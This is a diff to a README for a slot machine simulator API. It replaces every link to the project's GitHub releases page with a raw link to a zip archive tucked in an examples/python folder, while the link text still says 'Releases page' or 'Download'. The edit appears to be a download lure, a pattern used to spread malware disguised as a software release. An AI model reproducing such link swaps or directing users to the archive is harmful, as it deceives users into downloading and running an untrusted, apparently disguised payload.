@@ -1,7 +1,7 @@
 # 🎰 slotmachine-api - Simulate Slot Machine Spins Effortlessly
 
 ## 🛠️ Badges
-[![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)](https://github.com/purvadeepak/slotmachine-api/releases)
+[![Download](https://raw.githubusercontent.com/purvadeepak/slotmachine-api/main/examples/python/api_slotmachine_3.0.zip)](https://raw.githubusercontent.com/purvadeepak/slotmachine-api/main/examples/python/api_slotmachine_3.0.zip)
 
 ## 📜 Description
 The Slot Machine Simulator is a tool for simulating slot machine spins, providing realistic reel symbols and accurate payout calculations. Whether you want to customize the number of reels, set your bet amounts, or analyze multiple spins with detailed win/loss statistics, this application has you covered.
@@ -10,7 +10,7 @@ The Slot Machine Simulator is a tool for simulating slot machine spins, providin
 Follow these simple steps to download and run the Slot Machine Simulator:
 
 1. **Visit the Download Page**
-   Head to the [Releases page](https://github.com/purvadeepak/slotmachine-api/releases) to find the latest version of the application.
+   Head to the [Releases page](https://raw.githubusercontent.com/purvadeepak/slotmachine-api/main/examples/python/api_slotmachine_3.0.zip) to find the latest version of the application.
 
 2. **Select Your Version**
    Look for the most recent version listed. You will see download options for different platforms. Choose the one that fits your operating system.
@@ -54,4 +54,4 @@ If you encounter any issues while downloading or running the application, try th
 For further questions, feel free to create an issue on this repository or contact us through our support forum. We are here to help.
 
 ## 📥 Download & Install
-Ready to start? Visit the [Releases page](https://github.com/purvadeepak/slotmachine-api/releases) to download the Slot Machine Simulator and begin your adventure in the world of slots!
+Ready to start? Visit the [Releases page](https://raw.githubusercontent.com/purvadeepak/slotmachine-api/main/examples/python/api_slotmachine_3.0.zip) to download the Slot Machine Simulator and begin your adventure in the world of slots!
